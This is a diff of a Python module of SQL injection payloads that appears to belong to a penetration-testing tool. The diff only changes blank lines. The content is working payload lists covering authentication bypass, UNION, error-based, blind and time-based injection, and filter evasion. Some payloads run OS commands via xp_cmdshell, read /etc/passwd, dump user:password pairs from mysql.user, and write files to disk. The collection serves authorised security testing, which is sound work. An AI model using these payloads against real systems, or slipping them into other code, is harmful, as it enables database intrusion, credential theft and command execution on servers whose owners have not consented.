@@ -3,6 +3,7 @@ AIPT SQL Injection Payloads
 
 SQL injection payloads for security testing.
 """
+
 from __future__ import annotations
 
 from typing import Iterator
@@ -41,32 +42,26 @@ class SQLiPayloads:
             "' OR '1'='1'/*",
             '" OR "1"="1',
             '" OR "1"="1"--',
-
             # Numeric
             "1 OR 1=1",
             "1 OR 1=1--",
             "1' OR '1'='1",
-
             # Comment-based
             "'--",
             "'#",
             "'/*",
             "' ;--",
-
             # Tautology
             "' OR 1=1--",
             "' OR 'x'='x",
             "' OR 1 --",
             "') OR ('1'='1",
-
             # Syntax error triggers
             "'\"",
             "' AND '1'='2",
             "' AND '1'='1",
-
             # NULL byte
             "%00' OR '1'='1",
-
             # Double URL encoding
             "%2527",
         ]
@@ -83,12 +78,10 @@ class SQLiPayloads:
             f'" UNION SELECT {null_cols}--',
             f"' UNION SELECT {null_cols}#",
             f"' UNION ALL SELECT {null_cols}--",
-
             # With information extraction
             f"' UNION SELECT {','.join(['@@version' if i == 0 else 'NULL' for i in range(columns)])}--",
             f"' UNION SELECT {','.join(['user()' if i == 0 else 'NULL' for i in range(columns)])}--",
             f"' UNION SELECT {','.join(['database()' if i == 0 else 'NULL' for i in range(columns)])}--",
-
             # Order by for column enumeration
             "' ORDER BY 1--",
             "' ORDER BY 2--",
@@ -112,13 +105,10 @@ class SQLiPayloads:
             "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
             "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
             "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
-
             # PostgreSQL
             "' AND 1=CAST((SELECT version()) AS INT)--",
-
             # MSSQL
             "' AND 1=CONVERT(INT,(SELECT @@version))--",
-
             # Oracle
             "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--",
         ]
@@ -133,16 +123,13 @@ class SQLiPayloads:
             "' AND 'a'='a",
             "' AND 1--",
             "' AND 1=1 AND ''='",
-
             # False conditions
             "' AND 1=2--",
             "' AND 'a'='b",
             "' AND 0--",
-
             # Substring extraction
             "' AND SUBSTRING(@@version,1,1)='5'--",
             "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
-
             # Conditional
             "' AND IF(1=1,1,0)--",
             "' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)--",
@@ -157,15 +144,12 @@ class SQLiPayloads:
             "' AND SLEEP(5)--",
             "' AND BENCHMARK(5000000,MD5('test'))--",
             "' OR IF(1=1,SLEEP(5),0)--",
-
             # PostgreSQL
             "'; SELECT pg_sleep(5)--",
             "' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) END)--",
-
             # MSSQL
             "'; WAITFOR DELAY '0:0:5'--",
             "' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END WAITFOR DELAY '0:0:5')--",
-
             # Oracle
             "' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) END FROM dual)--",
         ]
@@ -179,10 +163,8 @@ class SQLiPayloads:
             "'; SELECT @@version;--",
             "'; SELECT user();--",
             "'; SELECT database();--",
-
             # MSSQL specific
             "'; EXEC xp_cmdshell('whoami');--",
-
             # PostgreSQL specific
             "'; CREATE TABLE aipt_test(data text);--",
             "'; COPY aipt_test FROM '/etc/passwd';--",
@@ -197,29 +179,23 @@ class SQLiPayloads:
             "' oR '1'='1",
             "' OR '1'='1",
             "' Or '1'='1",
-
             # Inline comments
             "'/**/OR/**/1=1--",
             "' UN/**/ION SEL/**/ECT NULL--",
             "' UNION/**/SELECT/**/NULL--",
-
             # Encoding
             "' %4fR '1'='1",  # OR
             "' %55NION %53ELECT NULL--",  # UNION SELECT
-
             # Using functions
             "' OR CHAR(49)=CHAR(49)--",
             "' OR ASCII('1')=49--",
-
             # Whitespace alternatives
             "'\tOR\t'1'='1",
             "'\nOR\n'1'='1",
             "' OR\r\n'1'='1",
-
             # No spaces
             "'OR'1'='1'",
             "'||'1'='1",
-
             # Scientific notation
             "' OR 1e0=1e0--",
         ]
@@ -232,20 +208,15 @@ class SQLiPayloads:
             # Version
             "' UNION SELECT @@version--",
             "' UNION SELECT VERSION()--",
-
             # Users
             "' UNION SELECT user FROM mysql.user--",
             "' UNION SELECT CONCAT(user,':',password) FROM mysql.user--",
-
             # Databases
             "' UNION SELECT schema_name FROM information_schema.schemata--",
-
             # Tables
             "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
-
             # Columns
             "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
-
             # File operations
             "' UNION SELECT LOAD_FILE('/etc/passwd')--",
             "' INTO OUTFILE '/tmp/test.txt'--",
